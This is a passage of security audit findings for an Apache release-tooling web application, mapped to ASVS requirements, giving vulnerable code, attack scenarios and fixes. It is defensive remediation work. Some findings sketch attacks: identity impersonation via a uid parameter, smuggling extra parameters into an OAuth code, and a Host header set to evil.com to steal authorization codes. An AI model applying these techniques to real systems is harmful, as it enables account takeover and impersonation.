- Internal architecture and implementation
- Database schema and relationships
- Caching strategies
- Error details and stack traces
- Internal identifiers

### Recommended Remediation
Define public-safe response models that explicitly include only fields appropriate for public consumption:

```python
# In atr/models/api.py
class TaskPublicView(BaseModel):
    """Public-safe task view."""
    id: int
    status: str
    task_type: str
    project_key: Optional[str]
    version_key: Optional[str]
    added: datetime
    completed: Optional[datetime]
    # EXCLUDE: pid, task_args, error, result, asf_uid

class CheckResultPublicView(BaseModel):
    """Public-safe check result view."""
    id: int
    check_name: str
    status: str
    message: Optional[str]
    path: Optional[str]
    # EXCLUDE: inputs_hash, checker_version, cached, check_cache_key, data

# In atr/api/__init__.py
async def list_tasks(project_key: str):
    tasks = await data.get_tasks(project_key)
    # Convert to public-safe view
    return [TaskPublicView.model_validate(t) for t in tasks]
```

Apply field filtering by converting SQL models to Safe models before serialization for all public API endpoints.

### Acceptance Criteria
- [ ] Public-safe response models defined for all public API endpoints
- [ ] Internal implementation fields are excluded from public responses
- [ ] SQL models are converted to safe models before serialization
- [ ] Unit tests verify field filtering
- [ ] Integration tests verify internal fields are not exposed

### References
- Source reports: L2:8.2.3.md
- Related findings: ASVS-823-MED-002
- ASVS sections: 8.2.3

### Priority
Medium

---

## Issue: FINDING-264 - Systemic Absence of Authorization-Based Response Differentiation

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The application has a reader hierarchy (`ReadAsGeneralPublic` → `ReadAsFoundationCommitter`) that provides different **methods** based on authorization level, but does not provide different **field sets** for the same resource. All consumers (public, authenticated committer, committee member, admin) receive identical response structures, violating the principle of least privilege at the field level. This means public users receive the same data fields as administrators, just with different method access.

### Details
In `atr/storage/readers/`:
- Reader hierarchy provides different methods per authorization level
- BUT: Same resource returns same fields regardless of authorization
- Public users and admins receive identical field sets
- No tiered response models based on authorization level

Example: Release resource returns same fields for:
- Public unauthenticated user
- Authenticated committer
- Committee member
- Administrator

This violates principle of least privilege because:
- Public users receive more data than necessary
- Internal fields are exposed to all authorization levels
- No differentiation based on authorization context
- Information disclosure risk across authorization boundaries

### Recommended Remediation
Implement tiered response models based on authorization level:

```python
# In atr/models/api.py
class ReleasePublicView(BaseModel):
    """Public view - minimal fields."""
    project_key: str
    version_key: str
    phase: str
    created: datetime

class ReleaseMemberView(ReleasePublicView):
    """Committee member view - includes policy and votes."""
    vote_status: Optional[str]
    policy_id: int
    committee_key: str

class ReleaseAdminView(ReleaseMemberView):
    """Admin view - includes all internal metadata."""
    cache_keys: Dict[str, str]
    internal_status: str
    github_metadata: Optional[Dict]

# In API endpoints
async def get_release(project_key: str, version_key: str):
    release = await data.get_release(project_key, version_key)
    
    # Select view based on authorization
    if is_admin():
        return ReleaseAdminView.model_validate(release)
    elif is_committee_member(release.committee_key):
        return ReleaseMemberView.model_validate(release)
    else:
        return ReleasePublicView.model_validate(release)
```

Apply authorization-based selection in endpoints to return appropriate view level based on authenticated user's role.

### Acceptance Criteria
- [ ] Tiered response models defined for all resources
- [ ] Public view includes only essential fields
- [ ] Member view includes additional authorized fields
- [ ] Admin view includes internal metadata
- [ ] Authorization level determines response model
- [ ] Unit tests verify field filtering per authorization level

### References
- Source reports: L2:8.2.3.md
- Related findings: ASVS-823-MED-001
- ASVS sections: 8.2.3

### Priority
Medium

---

## Issue: FINDING-265 - Dynamic Field Assignment Without Explicit Allowlist in Policy Updates

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The policy update function uses dynamic field assignment via `setattr()` loop without an explicit allowlist, creating risk that future model expansions could inadvertently expose additional writable fields. This violates BOPLA (Broken Object Property Level Authorization) protection principles where field-level write access should be explicit, not derived from model structure. Sibling methods (`edit_compose`, `edit_vote`) use explicit field assignment, creating an inconsistency that increases risk of accidental exposure.

### Details
In `atr/storage/writers/policy.py` (lines 117-140), the policy update function uses:
```python
for field_name in update.model_fields_set:
    setattr(policy, field_name, getattr(update, field_name))
```

This dynamically assigns ALL fields present in the update model without verifying they should be writable. If the Pydantic model is expanded with new fields:
- Those fields automatically become writable
- No explicit review of write permissions required
- Potential security bypass through model expansion

Sibling methods use explicit assignment:
```python
# edit_compose() - explicit fields
policy.compose_from_podling = update.compose_from_podling
policy.compose_from_release = update.compose_from_release

# edit_vote() - explicit fields  
policy.manual_vote = update.manual_vote
policy.min_hours = update.min_hours
```

### Recommended Remediation
Define an explicit `_EDITABLE_POLICY_FIELDS` frozenset allowlist:

```python
# In atr/storage/writers/policy.py

# Define allowlist at module level
_EDITABLE_POLICY_FIELDS = frozenset([
    'github_repository_name',
    'github_workflow_path',
    'github_sbom_workflow_path',
    # Add other intentionally editable fields
])

# In edit_finish() method
async def edit_finish(self, project_key: str, update: PolicyUpdateArgs):
    policy = await self._get_policy(project_key)
    
    # Intersect with allowlist
    fields_to_update = update.model_fields_set & _EDITABLE_POLICY_FIELDS
    
    # Detect unexpected fields
    unexpected_fields = update.model_fields_set - _EDITABLE_POLICY_FIELDS
    if unexpected_fields:
        raise ValueError(
            f"Attempt to modify non-editable fields: {unexpected_fields}"
        )
    
    # Update only allowed fields
    for field_name in fields_to_update:
        setattr(policy, field_name, getattr(update, field_name))
    
    await self._commit()
```

This ensures field editability is explicitly controlled rather than implicitly derived from the Pydantic model structure.

### Acceptance Criteria
- [ ] Explicit allowlist defines editable policy fields
- [ ] Dynamic field assignment is limited to allowlist
- [ ] Unexpected fields trigger clear error
- [ ] Model expansion requires explicit allowlist update
- [ ] Unit test verifies allowlist enforcement
- [ ] Unit test attempts to write non-allowed field

### References
- Source reports: L2:8.2.3.md
- Related findings: None
- ASVS sections: 8.2.3

### Priority
Medium

---

## Issue: FINDING-266 - Pagination Offset Validation Disabled by Typo

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
A typo in the pagination validation function (`'offest'` instead of `'offset'`) prevents offset boundary enforcement, allowing unbounded pagination that facilitates bulk data extraction beyond intended security design limits. The validation function checks `hasattr(query_args, 'offest')` which will always be False, preventing the offset limit (max 1,000,000) from being enforced. This enables attackers to bypass pagination limits and extract large datasets.

### Details
In `atr/api/__init__.py` (lines 1338-1352), the pagination validation contains:
```python
if hasattr(query_args, 'offest'):  # TYPO: should be 'offset'
    offset = query_args.offset
    if offset > 1000000:
        raise exceptions.BadRequest("Maximum offset of 1000000 exceeded")
```

The typo causes:
- `hasattr(query_args, 'offest')` always returns `False`
- Validation block never executes
- Offset limit is never enforced
- Attackers can use arbitrarily large offsets

Attack scenario:
1. Attacker calls API with `?offset=999999999`
2. Validation is bypassed due to typo
3. Database performs expensive offset scan
4. Attacker extracts data beyond intended limits
5. Resource exhaustion possible

### Recommended Remediation
Fix the typo by changing `'offest'` to `'offset'`:

```python
# In atr/api/__init__.py
if hasattr(query_args, 'offset'):  # Fixed typo
    offset = query_args.offset
    if offset > 1000000:
        raise exceptions.BadRequest("Maximum offset of 1000000 exceeded")
```

This is a trivial one-character fix that will restore the intended pagination boundary enforcement.

### Acceptance Criteria
- [ ] Typo is corrected from 'offest' to 'offset'
- [ ] Offset validation is enforced for values > 1,000,000
- [ ] Error message is returned for excessive offsets
- [ ] Unit test verifies offset validation
- [ ] Integration test attempts large offset value

### References
- Source reports: L2:8.2.3.md
- Related findings: None
- ASVS sections: 8.2.3

### Priority
Medium

---

## Issue: FINDING-267 - Unvalidated Identity Parameter in Email and Vote Operations

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Committee member methods accept `asf_uid` as a parameter while also having `self.__asf_uid` from the authorization constructor. This creates risk where the storage layer has the correct identity but doesn't enforce it for all operations, potentially allowing email impersonation and authorization bypass. A committee member could invoke methods with another user's `asf_uid`, causing announcement/vote emails to be sent as `{other_user}@apache.org` with recipient lists determined by another user's permissions.

### Details
In `atr/storage/writers/`:
- `announce.py` (lines 99-183): `send()` method accepts `asf_uid` parameter
- `vote.py` (lines 87-141): `start()` method accepts `asf_uid` parameter  
- `vote.py` (lines 252-307): `resolve()` method accepts `asf_uid` parameter

The storage writer has `self.__asf_uid` from authorization context, but methods also accept `asf_uid` as parameter. If parameter doesn't match `self.__asf_uid`:
- Emails sent with wrong "From" address
- Recipient lists determined by wrong user's permissions
- Audit logs attribute actions to wrong user
- Tasks created under wrong user identity

Attack scenario:
```python
# Attacker has committee member access
write = await data.write.as_committee_member(committee_key, attacker_uid)

# Attacker calls method with victim's UID
await write.send_announcement(
    project_key=project_key,
    asf_uid=victim_uid  # Impersonation
)
# Email sent as victim_uid@apache.org
```

### Recommended Remediation
**Option A (Recommended):** Remove `asf_uid` parameter and always use `self.__asf_uid`:

```python
# In atr/storage/writers/announce.py
class AnnouncementWriter:
    async def send(self, project_key: str, ...):
        # Use authenticated identity from constructor
        from_address = f"{self.__asf_uid}@apache.org"
        
        # Create task with authenticated identity
        task = Task(
            asf_uid=self.__asf_uid,  # Always use self.__asf_uid
            task_type=TaskType.ANNOUNCEMENT,
            ...
        )
```

**Option B:** Add validation assertion:

```python
async def send(self, project_key: str, asf_uid: str, ...):
    # Verify parameter matches authenticated identity
    if asf_uid != self.__asf_uid:
        raise storage.AccessError(
            f"Cannot perform operation as {asf_uid}: "
            f"authenticated as {self.__asf_uid}"
        )
    # ... rest of method ...
```

Apply same pattern to `vote.py` methods.

### Acceptance Criteria
- [ ] Identity parameter is removed or validated
- [ ] Operations always use authenticated identity from constructor
- [ ] Email "From" addresses match authenticated user
- [ ] Audit logs attribute actions to correct user
- [ ] Unit test verifies identity enforcement
- [ ] Unit test attempts impersonation (if validation approach used)

### References
- Source reports: L2:8.2.3.md
- Related findings: None
- ASVS sections: 8.2.3

### Priority
Medium

---

## Issue: FINDING-268 - ATR JWTs Lack Explicit Token Type Identification

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
ATR JWTs do not include an explicit token type indicator. Neither a `typ` header (e.g., `at+jwt` per RFC 9068) nor a custom `token_type` claim is present. The `verify()` function does not validate any token type field. While no active exploits exist due to robust architectural separation (algorithm, audience, issuer differences), this represents a defense-in-depth gap. If ATR evolves to issue additional JWT types (e.g., refresh tokens, delegation tokens), the absence of an explicit type field would create cross-usage risk within the same issuer context.

### Details
In `atr/jwtoken.py`:
- `issue()` function (lines 70-83) does not add `typ` header or `token_type` claim
- `verify()` function (lines 104-137) does not validate token type

Current JWT lacks:
- `typ` header (RFC 9068 recommends `at+jwt` for access tokens)
- `token_type` claim (custom claim for application-specific type)

While current architecture prevents cross-usage (different algorithms, audiences, issuers for different systems), future expansion could introduce:
- Refresh tokens with longer TTL
- Delegation tokens for service-to-service auth
- Short-lived one-time tokens

Without explicit type indicators, these could be confused or misused.

### Recommended Remediation
Add explicit token type indicators:

```python
# In atr/jwtoken.py

def issue(uid: str, pat_hash: Optional[str] = None) -> str:
    """Issue JWT with explicit type indicators."""
    now = datetime.utcnow()
    
    # Create payload with token type claim
    payload = {
        "sub": uid,
        "iss": "https://atr.apache.org",
        "aud": "atr-api",
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(minutes=30)).timestamp()),
        "jti": secrets.token_urlsafe(16),
        "token_type": "atr_api_access",  # ADD: Explicit type claim
    }
    
    if pat_hash:
        payload["atr_th"] = pat_hash
    
    # Add explicit type header per RFC 9068
    headers = {
        "typ": "at+jwt"  # ADD: Access token type header
    }
    
    return jwt.encode(payload, key, algorithm="HS256", headers=headers)

def verify(token: str) -> Optional[Dict]:
    """Verify JWT with type validation."""
    try:
        # Decode with header validation
        header = jwt.get_unverified_header(token)
        
        # Validate type header
        if header.get("typ") != "at+jwt":
            log.warning(f"Invalid JWT type header: {header.get('typ')}")
            return None
        
        payload = jwt.decode(token, key, algorithms=["HS256"], ...)
        
        # Validate type claim
        if payload.get("token_type") != "atr_api_access":
            log.warning(f"Invalid JWT type claim: {payload.get('token_type')}")
            return None
        
        # ... rest of validation ...
        return payload
    except jwt.InvalidTokenError:
        return None
```

This future-proofs against token type expansion and improves defense-in-depth.

### Acceptance Criteria
- [ ] JWTs include `typ: "at+jwt"` header per RFC 9068
- [ ] JWTs include `token_type: "atr_api_access"` claim
- [ ] `verify()` validates both type indicators
- [ ] Invalid type indicators are rejected with logged warning
- [ ] Unit tests verify type validation
- [ ] Documentation explains token type indicators

### References
- Source reports: L2:9.2.2.md
- Related findings: None
- ASVS sections: 9.2.2

### Priority
Medium

---

## Issue: FINDING-269 - Authorization Code Not URL-Encoded in Token Exchange Request

**Labels:** bug, security, priority:medium, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** [L1, L2]

**Description:**

### Summary
The authorization code received from the OAuth callback is interpolated directly into the token exchange URL without URL encoding. If the authorization code contains URL-special characters (&, =, #, %), the request URL would be malformed. An attacker controlling the code parameter could potentially inject additional query parameters, confusing server-side logic or bypassing validation checks. While OAuth authorization codes are typically alphanumeric-only by Authorization Server design and the token endpoint should reject invalid codes, this practice violates defensive programming principles.

### Details
In `src/asfquart/generics.py`:
- Line 109: `rv = await session.get(OAUTH_URL_CALLBACK % code)`
- Lines 12-14: `OAUTH_URL_CALLBACK` template with `%s` placeholder

The authorization code is directly interpolated without URL encoding:
```python
OAUTH_URL_CALLBACK = "https://oauth.apache.org/auth-callback?code=%s"
rv = await session.get(OAUTH_URL_CALLBACK % code)
```

Potential attack scenario:
1. Attacker crafts malicious `code` parameter: `legit_code&client_id=attacker_client`
2. Resulting URL: `https://oauth.apache.org/auth-callback?code=legit_code&client_id=attacker_client`
3. Additional `client_id` parameter injected
4. Potential parameter pollution or validation bypass

While unlikely due to OAuth code format constraints, this violates defense-in-depth.

### Recommended Remediation
**Option 1 (Simple):** Apply URL-encoding to authorization code:
```python
import urllib.parse

# In src/asfquart/generics.py
rv = await session.get(OAUTH_URL_CALLBACK % urllib.parse.quote(code, safe=''))
```

**Option 2 (Preferred):** Use proper URL construction with params dictionary:
```python
import urllib.parse

# In src/asfquart/generics.py  
callback_base = "https://oauth.apache.org/auth-callback"
rv = await session.get(callback_base, params={'code': code})
```

This ensures proper encoding regardless of code content and prevents parameter injection attacks.

### Acceptance Criteria
- [ ] Authorization code is URL-encoded before interpolation
- [ ] URL construction uses proper parameter handling
- [ ] Special characters in code don't break URL structure
- [ ] Unit test with special characters in code parameter
- [ ] No functional regression in OAuth flow

### References
- Source reports: L1:10.4.1.md, L1:10.4.2.md, L1:10.4.4.md, L2:10.4.7.md
- Related findings: None
- ASVS sections: 10.4.1, 10.4.2, 10.4.4, 10.4.7

### Priority
Medium

---

## Issue: FINDING-270 - Dynamic OAuth Callback URL Constructed from Host Header

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The OAuth `redirect_uri` parameter is dynamically derived from the HTTP Host header. This violates ASVS 10.4.1 because the client sends a variable callback URL instead of a fixed, pre-registered one. If the deployment violates the documented `ProxyPreserveHost On` assumption, an attacker controlling the Host header can craft an arbitrary callback URL. If the authorization server uses pattern-based or prefix matching instead of exact string comparison, the authorization code could be redirected to an attacker-controlled domain, leading to authorization code theft and account takeover.

### Details
In `src/asfquart/generics.py` (lines 63-68):
```python
callback_host = quart.request.host_url.replace('http://', 'https://')
callback_url = urllib.parse.urljoin(callback_host, f'{uri}?state={state}')
```

The callback URL is dynamically constructed from `request.host_url`, which is derived from the Host header. This creates risk:

1. **Variable callback URL**: Different for each request based on Host header
2. **Host header manipulation**: If proxy misconfigured, attacker controls callback URL
3. **Authorization Server validation**: Depends on AS using exact string matching

Attack scenario (if deployment misconfigured):
1. Attacker sends request with `Host: evil.com`
2. Callback URL becomes `https://evil.com/auth?state=...`
3. User authenticates at AS
4. AS redirects authorization code to `https://evil.com/auth?code=...`
5. Attacker captures authorization code
6. Account takeover

Mitigations:
- Documented requirement: `ProxyPreserveHost On` (but not enforced)
- AS should use exact string matching (but not verified)

### Recommended Remediation
Pre-configure the callback host using an environment variable instead of deriving it from the request:

```python
# In configuration
CALLBACK_HOST = os.environ.get('OAUTH_CALLBACK_HOST', 'https://atr.apache.org')

# In src/asfquart/generics.py
def setup_oauth(callback_host: str):
    """Setup OAuth with fixed callback host."""
    global OAUTH_CALLBACK_HOST
    OAUTH_CALLBACK_HOST = callback_host

def oauth_endpoint(uri: str):
    """Generate OAuth authorization URL with fixed callback."""
    state = generate_state_token()
    
    # Use fixed callback host from configuration
    callback_url = urllib.parse.urljoin(OAUTH_CALLBACK_HOST, f'{uri}?state={state}')
    
    authorization_url = OAUTH_URL_INIT % (state, urllib.parse.quote(callback_url))
    return quart.redirect(authorization_url)
```

This ensures the callback URL is fixed and can be pre-registered with exact string matching at the Authorization Server.

### Acceptance Criteria
- [ ] Callback URL is derived from configuration, not request
- [ ] Callback URL is fixed for all requests
- [ ] Configuration variable is documented
- [ ] Callback URL can be pre-registered at AS with exact matching
- [ ] Unit test verifies fixed callback URL
- [ ] Documentation updated with configuration requirement

### References
- Source reports: L1:10.4.1.md
- Related findings: FINDING-453
- ASVS sections: 10.4.1

### Priority
Medium

---

## Issue: FINDING-271 - OAuth Client Does Not Request Explicit Scopes (Principle of Least Privilege)

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The OAuth authorization request does not include a `scope` parameter. ATR receives whatever data `oauth.apache.org` returns by default without requesting only the minimum claims needed (e.g., `uid`, `dn`, `fullname`). While scope assignment is the Authorization Server's responsibility, the OAuth client should request only the scopes it needs per the principle of least privilege (OAuth 2.0 Security Best Current Practice §2.4). If `oauth.apache.org` returns more data than ATR needs, it increases the surface area of session data that could be exposed in a session compromise.

### Details
In `src/asfquart/generics.py`:
- Line 11: `OAUTH_URL_INIT` template does not include `scope` parameter
- Lines 36-50: OAuth authorization URL construction without scopes

Current authorization URL:
```python
OAUTH_URL_INIT = 'https://oauth.apache.org/auth-oidc?state=%s&redirect_uri=%s'
```

Should request explicit scopes:
```python
OAUTH_URL_INIT = 'https://oauth.apache.org/auth-oidc?state=%s&redirect_uri=%s&scope=%s'
```

Without explicit scope request:
- ATR receives all data AS provides by default
- May include unnecessary claims
- Increases exposure in session compromise
- Violates principle of least privilege

### Recommended Remediation
Add explicit scope parameter to the OAuth authorization URL:

```python
# In src/asfquart/generics.py
OAUTH_URL_INIT = 'https://oauth.apache.org/auth-oidc?state=%s&redirect_uri=%s&scope=openid+uid+dn+fullname'

# In oauth_endpoint()
def oauth_endpoint(uri: str):
    state = generate_state_token()
    callback_url = get_callback_url(uri, state)
    
    # Request only needed scopes
    scopes = 'openid uid dn fullname'  # Minimal required claims
    authorization_url = OAUTH_URL_INIT % (
        state, 
        urllib.parse.quote(callback_url),
        urllib.parse.quote(scopes, safe='')
    )
    
    return quart.redirect(authorization_url)
```

**Important:** Coordinate with `oauth.apache.org` maintainers to verify:
1. Whether the service supports granular scope parameters
2. What the current client registration assigns
3. Whether client-side scope requests are honored
4. If AS ignores scopes, document as accepted risk and ensure AS-side client registration is minimal

### Acceptance Criteria
- [ ] OAuth authorization request includes explicit `scope` parameter
- [ ] Scopes are limited to minimum required claims
- [ ] Coordination with AS maintainers is complete
- [ ] AS scope support is documented
- [ ] If AS doesn't support scopes, accepted risk is documented
- [ ] Unit test verifies scope parameter in authorization URL

### References
- Source reports: L2:10.4.11.md
- Related findings: FINDING-460, FINDING-461
- ASVS sections: 10.4.11

### Priority
Medium

---

## Issue: FINDING-272 - OAuth Token Exchange Uses Default SSL Context Without Hardened TLS Configuration

**Labels:** bug, security, priority:medium, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** [L1, L2]

**Description:**

### Summary
The OAuth token exchange—a security-critical operation that retrieves user authentication credentials—creates a plain `aiohttp.ClientSession()` without the hardened SSL context used throughout the rest of the application. While `aiohttp`'s default behavior validates certificates and checks hostnames on modern systems, the absence of explicit `minimum_version = TLSv1_2` enforcement means the session may negotiate TLS 1.0/1.1 on systems where these protocols are not disabled at the OpenSSL level. This creates an inconsistency with security controls applied to all other outbound connections, which all use the centralized `util.create_secure_ssl_context()` factory.

### Details
In `src/asfquart/generics.py` (lines 76-95), the OAuth token exchange creates a plain session:
```python
async with aiohttp.ClientSession(timeout=ct) as session:
    rv = await session.get(OAUTH_URL_CALLBACK % code)
```

All other outbound connections use hardened SSL context:
- GitHub OIDC: Uses `util.create_secure_session()`
- GitHub API: Uses `util.create_secure_session()`
- OSV: Uses `util.create_secure_session()`
- Mailing lists: Uses `util.create_secure_session()`

The hardened context enforces:
- `minimum_version = ssl.TLSVersion.TLSv1_2`
- `verify_mode = ssl.CERT_REQUIRED`
- `check_hostname = True`

OAuth token exchange lacks these enforcements, creating security inconsistency.

### Recommended Remediation
**Option 1 (Recommended):** Use the existing secure session factory:
```python
# In src/asfquart/generics.py
from atr import util

# Replace plain session creation
async with util.create_secure_session(timeout=aiohttp.ClientTimeout(sock_read=15)) as session:
    rv = await session.get(OAUTH_URL_CALLBACK % code)
```

**Option 2:** Create a hardened SSL context inline:
```python
import ssl
import aiohttp

# In src/asfquart/generics.py
ssl_ctx = ssl.create_default_context()
ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_2
connector = aiohttp.TCPConnector(ssl=ssl_ctx)

ct = aiohttp.ClientTimeout(sock_read=15)
async with aiohttp.ClientSession(timeout=ct, connector=connector) as session:
    rv = await session.get(OAUTH_URL_CALLBACK % code)
```

**Option 3 (Minimal):** If circular dependency exists, create a local secure session factory with explicit TLS 1.2+ enforcement, CERT_REQUIRED, and check_hostname=True.

Add integration test to verify OAuth uses hardened SSL context.

### Acceptance Criteria
- [ ] OAuth token exchange uses hardened SSL context
- [ ] TLS 1.2+ is enforced for OAuth connections
- [ ] Certificate validation is explicitly enabled
- [ ] Hostname checking is explicitly enabled
- [ ] Consistent with other outbound connections
- [ ] Integration test verifies TLS configuration

### References
- Source reports: L1:12.2.1.md, L1:12.2.2.md, L2:12.1.2.md
- Related findings: FINDING-273
- ASVS sections: 12.2.1, 12.2.2, 12.1.2

### Priority
Medium

---

## Issue: FINDING-273 - Outbound TLS Connections Do Not Restrict to AEAD-Only Ciphers

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The outbound TLS SSL context creation function (`create_secure_ssl_context()`) does not explicitly restrict cipher suites to AEAD-only algorithms. While the function is documented as creating a "secure SSL context compliant with ASVS 9.1.1 and 9.1.2," it relies on Python's `ssl.create_default_context()` defaults, which include CBC-mode cipher suites. If an outbound connection targets a server that only supports TLS 1.2 with AES-CBC cipher suites, the Python SSL context would negotiate and use the CBC cipher. This does not fully meet ASVS 11.3.2's requirement for "only approved ciphers and modes such as AES with GCM".

### Details
In `atr/util.py` (lines 254-263), the `create_secure_ssl_context()` function:
```python
def create_secure_ssl_context() -> ssl.SSLContext:
    """Create a secure SSL context compliant with ASVS 9.1.1 and 9.1.2."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = True
    ctx.verify_mode = ssl.CERT_REQUIRED
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    # MISSING: ctx.set_ciphers() for AEAD-only restriction
    return ctx
```

The function enforces:
- Certificate validation ✓
- Hostname checking ✓  
- TLS 1.2+ ✓

But does NOT enforce:
- AEAD-only ciphers ✗

Python's default context includes CBC-mode ciphers:
- `ECDHE-RSA-AES128-SHA256` (CBC mode)
- `ECDHE-RSA-AES256-SHA384` (CBC mode)
- Others

This creates a gap between:
- Inbound TLS (Apache): AEAD-only enforced
- Outbound TLS (Python): CBC allowed

### Recommended Remediation
Add explicit AEAD-only cipher suite restriction:

```python
def create_secure_ssl_context() -> ssl.SSLContext:
    """Create a secure SSL context compliant with ASVS 9.1.1, 9.1.2, and 11.3.2."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = True
    ctx.verify_mode = ssl.CERT_REQUIRED
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    
    # Restrict to AEAD-only cipher suites, matching inbound Apache TLS config
    ctx.set_ciphers(
        "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS"
    )
    
    return ctx
```

**Alternative (more restrictive):** If TLS 1.3 is available on target servers, set `ctx.minimum_version = ssl.TLSVersion.TLSv1_3` (TLS 1.3 only uses AEAD ciphers by design).

### Acceptance Criteria
- [ ] Outbound SSL context restricts to AEAD-only ciphers
- [ ] CBC-mode ciphers are excluded
- [ ] Cipher configuration matches inbound Apache config
- [ ] Unit test verifies cipher restriction
- [ ] Integration test confirms AEAD cipher negotiation

### References
- Source reports: L1:11.3.2.md
- Related findings: FINDING-272
- ASVS sections: 11.3.2

### Priority
Medium

---

## Issue: FINDING-274 - Development Virtual Host Missing Comprehensive TLS Hardening Configuration

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The development virtual host (`tooling-vm-ec2-de.apache.org`) is publicly accessible and hosts the ATR development instance. While it has `force_tls: true` for HTTP-to-HTTPS redirection, it lacks the TLS protocol restrictions, cipher suite hardening, HSTS headers, and security headers present in the staging environment configuration (`release-test.apache.org`). This configuration drift creates several risks: legacy TLS versions may be negotiated, weak cipher suites may be accepted, no HSTS protection for first-time visitors, and increased risk of production misconfiguration due to environment differences.

### Details
In `tooling-vm-ec2-de.apache.org.yaml` (lines 112-170), the development vhost has:
- `force_tls: true` ✓
- No TLS protocol restrictions ✗
- No cipher suite hardening ✗
- No HSTS headers ✗
- No security headers (X-Content-Type-Options, X-Frame-Options, Referrer-Policy) ✗

The staging vhost (`release-test.apache.org`) includes:
- `SSLProtocol -all +TLSv1.2 +TLSv1.3`
- `SSLProxyProtocol -all +TLSv1.2 +TLSv1.3`
- `SSLCipherSuite` with AEAD-only ciphers
- `SSLOpenSSLConfCmd Curves X25519:prime256v1:secp384r1`
- `SSLSessionTickets off`
- `SSLCompression off`
- `Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains"`
- `Header always set X-Content-Type-Options "nosniff"`
- `Header always set X-Frame-Options "DENY"`
- `Header always set Referrer-Policy "same-origin"`

This configuration drift creates:
- Inconsistent security posture across environments
- Risk of legacy TLS negotiation in development
- No HSTS protection for development users
- Production deployment risk (missing configs not tested in dev)

### Recommended Remediation
Apply identical TLS hardening configuration to the development vhost:

```yaml
# In tooling-vm-ec2-de.apache.org.yaml
custom_fragment: |
  # TLS Protocol Restrictions
  SSLProtocol -all +TLSv1.2 +TLSv1.3
  SSLProxyProtocol -all +TLSv1.2 +TLSv1.3
  
  # AEAD-Only Cipher Suites
  SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-CHACHA20-POLY1305
  
  # Elliptic Curve Configuration
  SSLOpenSSLConfCmd Curves X25519:prime256v1:secp384r1
  
  # Session Security
  SSLSessionTickets off
  SSLCompression off
  
  # Security Headers
  Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains"
  Header always set X-Content-Type-Options "nosniff"
  Header always set X-Frame-Options "DENY"
  Header always set Referrer-Policy "same-origin"
```

Verify with:
- `openssl s_client -connect tooling-vm-ec2-de.apache.org:443 -tls1_1` (should fail)
- `curl -I https://tooling-vm-ec2-de.apache.org` (should show HSTS header)

### Acceptance Criteria
- [ ] Development vhost has identical TLS configuration to staging
- [ ] TLS 1.0/1.1 are rejected in development
- [ ] Only AEAD cipher suites are accepted
- [ ] HSTS header is sent with appropriate max-age
- [ ] Security headers are present (X-Content-Type-Options, X-Frame-Options, Referrer-Policy)
- [ ] Configuration is tested and verified
- [ ] Documentation explains environment configuration consistency

### References
- Source reports: L1:12.1.1.md, L1:12.2.1.md, L1:12.2.2.md
- Related findings: None
- ASVS sections: 12.1.1, 12.2.1, 12.2.2

### Priority
Medium

---

## Issue: FINDING-275 - Hypercorn Application Server Lacks Explicit TLS Version and Cipher Configuration

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The Hypercorn application server is started without explicit TLS protocol version or cipher suite configuration. While Hypercorn listens only on localhost (127.0.0.1:8443) behind the Apache reverse proxy (significantly mitigating the risk), defense-in-depth requires that internal TLS endpoints also enforce modern protocol versions. Python's default `ssl.SSLContext` in modern versions generally defaults to TLS 1.2+, but this is implicit behavior that could change with updates or environment differences. The startup scripts lack `--ciphers` flag and TLS version configuration.

### Details
In `start-atr.sh` and `start-dev.sh` (lines 19-22), Hypercorn is started without TLS configuration:
```bash
hypercorn --certfile secrets/generated/cert.pem \
          --keyfile secrets/generated/key.pem \
          --bind 127.0.0.1:8443 \
          atr.server:app
```

No TLS configuration is specified:
- No minimum TLS version
- No maximum TLS version  
- No cipher suite restriction
- Relies on Python SSL defaults

Additionally, the Apache proxy connection (`SSLProxyProtocol -all +TLSv1.2 +TLSv1.3`) is only configured on the staging vhost, not the dev vhost.

While Hypercorn is localhost-only (low risk), defense-in-depth principles require explicit TLS configuration for all TLS endpoints.

### Recommended Remediation
Configure Hypercorn's TLS settings explicitly via a configuration file:

```python
# Create hypercorn_config.py
import ssl

# Create hardened SSL context
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3
ssl_context.set_ciphers(
